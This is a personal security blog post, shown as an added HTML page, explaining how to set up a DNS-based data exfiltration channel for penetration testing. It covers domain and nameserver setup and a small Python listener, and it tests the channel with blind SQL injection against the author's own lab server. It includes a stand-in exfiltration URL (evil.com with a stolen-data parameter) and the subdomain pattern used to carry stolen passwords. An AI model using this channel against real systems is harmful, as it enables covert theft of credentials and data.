@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it&amp;rsquo;s as simple as scp&amp;rsquo;ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server?" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://john-woodman.com/research/2020-06-10-dns-exfiltration-setup/" />
+
+
+    <title>
+        
+            Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server) :: John Woodman&#39;s Security Blog 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.393856bf2c430bb6c01d7af07c6fe966e7cce8073435cfbbc46e590bab7405ef.css">
+
+
+
+
+
+
+<meta itemprop="name" content="Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)">
+<meta itemprop="description" content="Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it&rsquo;s as simple as scp&rsquo;ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server?">
+
+<meta itemprop="wordCount" content="1043">
+<meta itemprop="image" content="https://john-woodman.com/"/>
+
+
+
+<meta itemprop="keywords" content="" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://john-woodman.com/"/>
+
+<meta name="twitter:title" content="Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)"/>
+<meta name="twitter:description" content="Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it&rsquo;s as simple as scp&rsquo;ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server?"/>
+
+
+
+    <meta property="og:title" content="Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)" />
+<meta property="og:description" content="Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it&rsquo;s as simple as scp&rsquo;ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (www.evil.com?stolendata=password123). But what if firewall permissions are blocking any outbound HTTP traffic on the victim server?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://john-woodman.com/research/2020-06-10-dns-exfiltration-setup/" />
+<meta property="og:image" content="https://john-woodman.com/"/>
+<meta property="og:site_name" content="John Woodman&#39;s Security Blog" />
+
+
+
+
+    <meta property="article:section" content="posts" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">Security Blog</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://john-woodman.com/about">About</a></li><li><a href="https://john-woodman.com/gardening">Gardening</a></li><li><a href="https://john-woodman.com/research">Security</a></li><li><a href="https://john-woodman.com/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://john-woodman.com/research/2020-06-10-dns-exfiltration-setup/">Setting Up Your Own Malicious DNS Server For Data Exfiltration (Without a DNS Server)</a></h2>
+
+            
+
+            
+
+            <div class="post-content">
+                <p>Data exfiltration is a key component of any red team/penetration testing assesment. Sometimes it&rsquo;s as simple as scp&rsquo;ing the sensitive data over an SSH connection. Other times, however, more sophisticated methods need to be used. One such common method is exfiltrating data through specially crafted URL requests to your public web server, such as placing the sensitive data as a GET parameter (<a href="http://www.evil.com?stolendata=password123)">www.evil.com?stolendata=password123)</a>. But what if firewall permissions are blocking any outbound HTTP traffic on the victim server? Or has a whitelist of allowed sites and yours isn&rsquo;t on it (obviously)? Another method is still possible: DNS.</p>
+<p>In this post, I&rsquo;ll be showing how I set up a public malicious (depending on how you use it) DNS server for exfiltrating data without actually having to run a DNS server ;).</p>
+<h2 id="header-1what-is-dns-exfiltration"><a href="#header-1"></a>What Is DNS Exfiltration?</h2>
+<p>The general idea of DNS exfiltration isn&rsquo;t unsimilar to exfiltrating data through HTTP web requests. Sensitive data is attached to a DNS query that can then be viewed by our malicious DNS server. In this case, the sensitive data is prepended onto the subdomain of our controlled public domain. For example, if we were able to access the password of a user on a victim&rsquo;s machine, in order to exfil that data, we would have the victim machine make a DNS request for password123.myevildomain.com, with the &ldquo;password123&rdquo; being the victim&rsquo;s password. Since own myevildomain.com, the request to resolve password123 would come to my server. The best part is, I don&rsquo;t even have to actually respond to the request since I&rsquo;ve already got what I came for.</p>
+<h2 id="header-2what-youll-need"><a href="#header-2"></a>What You&rsquo;ll Need</h2>
+<ul>
+<li>Public Server you control (I used a digital ocean server)</li>
+<li>Public domain name linked to that server</li>
+</ul>
+<h2 id="header-3setting-up-the-pulbic-domain"><a href="#header-3"></a>Setting Up The Pulbic Domain</h2>
+<p>The first thing you need is a publicly registered domain. You can do this on a number of sites, but I used godaddy to register john-woodman.com and pointed it to my digitalocean server.</p>
+<h3 id="header-4creating-a-hostname-for-our-nameserver"><a href="#header-4"></a>Creating A Hostname For Our Nameserver</h3>
+<p>Once I registered the domain, I then added my own hostname as a nameserver through godaddy. The reason I had to do this is because nameserver records can&rsquo;t specify an IP address, it must be a hostname. I made the hostname for the nameserver ns.john-woodman.com and pointed it to my digitalocean server IP.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/1.png" alt="">{:height=&ldquo;100%&rdquo; width=&ldquo;100%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<h3 id="header-5setting-nameservers-to-digitaloceans"><a href="#header-5"></a>Setting Nameservers To DigitalOcean&rsquo;s</h3>
+<p>DigitalOcean actually has the ability to manage DNS records for you. While I could do everything on godaddy or whichever name resolution service you chose, I found DigitalOcean has a nice, simple interface. In godaddy, I set the custom nameservers to DigitalOcean&rsquo;s so that any DNS requests made to john-woodman.com would go to DigitalOcean.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/2.png" alt="">{:height=&ldquo;100%&rdquo; width=&ldquo;100%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<p>Now that we have that setup, we can do everything else on DigitalOcean.</p>
+<h3 id="header-6redirecting-subdomain-requests"><a href="#header-6"></a>Redirecting Subdomain Requests</h3>
+<p>I now have to create a few DNS records so that any requests to a specific subdomain will be redirected to my DNS Server instead of being handled by DigitalOcean&rsquo;s. I first have to create an A record that points all requests to john-woodman.com to my IP (this is mostly to keep my website up and running). I then have to create an A record that points the nameserver domain (ns.john-woodman.com) to my server&rsquo;s IP. Now, unfortunately, with NS records, I&rsquo;m not able to specify a wildcard in the subdomain (such as <code>*</code>.john-woodman.com). From what I can gather, it seems to just not be supported by DNS, with no reason why. Either way, we can get around this by actually just specifying any name for the subdomain, and all subdomain requests sent to that subdomain (subception) will be directed to our DNS server. In my case, I chose a completely random subdomain steve.john-woodman.com. You can call it whatever you want (probably best not to have special characters just to be safe). So when im exfiltrating data, the DNS request would look like for example: password123.steve.john-woodman.com. This is what my DNS configuration looks like on DigitalOcean.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/3.png" alt="">{:height=&ldquo;100%&rdquo; width=&ldquo;100%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<h2 id="header-7setting-up-the-listener"><a href="#header-7"></a>Setting Up The Listener</h2>
+<p>The nice part is we don&rsquo;t actually have to run any DNS service on our server. We can just set up a simple python listener, sift through the data we recieve and grab what we need. Below is the code I wrote to listen on UDP port 53 (DNS requests come in on UDP for the most part).</p>
+<p>{% highlight python %}
+import socket
+import sys
+from dnslib import DNSRecord</p>
+<p>server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</p>
+<p>server.bind((&lsquo;0.0.0.0&rsquo;, 53))</p>
+<p>while True:
+data, addr = server.recvfrom(4096)
+d = DNSRecord.parse(data)
+print(d.questions[0]._qname)
+if data:
+server.close()
+break
+{% endhighlight %}</p>
+<h2 id="header-8testing-and-exploiting"><a href="#header-8"></a>Testing and Exploiting</h2>
+<p>To make sure that it works, I can run a simple nslookup and see if my listener picks up the request.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/4.png" alt="">{:height=&ldquo;80%&rdquo; width=&ldquo;80%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<p>The nslookup failed, but thats expected since for one, we don&rsquo;t actually have any DNS service running, and second, the requested subdomain doesn&rsquo;t exist. But as you can see, our server did recieve the request and, most importantly, we can see the subdomain.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/5.png" alt="">{:height=&ldquo;75%&rdquo; width=&ldquo;75%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<h2 id="header-9exploiting"><a href="#header-9"></a>Exploiting</h2>
+<p>To really fully test our setup, I created a simple vulnerable webserver with a login page connected to a PostgreSQL database that contains login credentials. The webserver is vulnerable to SQL injection, but no output is returned to the user. There&rsquo;s a few different methods I could use (time-based for example), but why not use DNS exfiltration.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/6.png" alt="">{:height=&ldquo;100%&rdquo; width=&ldquo;100%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<p>I won&rsquo;t go into the exploit itself, but you can read about it <a href="https://portswigger.net/web-security/sql-injection/blind">here</a>. Using Burp, I sent the URL encoded exploit that retrieved the password from the SQL table and sent it as the subdomain in the DNS request.</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/7.png" alt="">{:height=&ldquo;100%&rdquo; width=&ldquo;100%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<p>With the listener running on our server, we recieved the DNS request and can see the password that was stored in the PostgreSQL database set as the subdomain!</p>
+<p><img src="/assets/2020-06-10-DNS-Exfiltration-Setup/8.png" alt="">{:height=&ldquo;75%&rdquo; width=&ldquo;75%&rdquo; style=&ldquo;display: block;  margin-right: auto;&quot;}</p>
+<h2 id="header-10conclusion"><a href="#header-10"></a>Conclusion</h2>
+<p>The inspiration for this project was trying to run my own server for DNS exfiltration instead of having to pay for the pro version of BurpSuite, which has a BurpCollaborator that will do this for you. I learned a lot more about DNS through this project, and I hope I was able to help you learn something too!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://john-woodman.com/categories/posts/">posts</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+            
+                <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://john-woodman.com/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+          </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
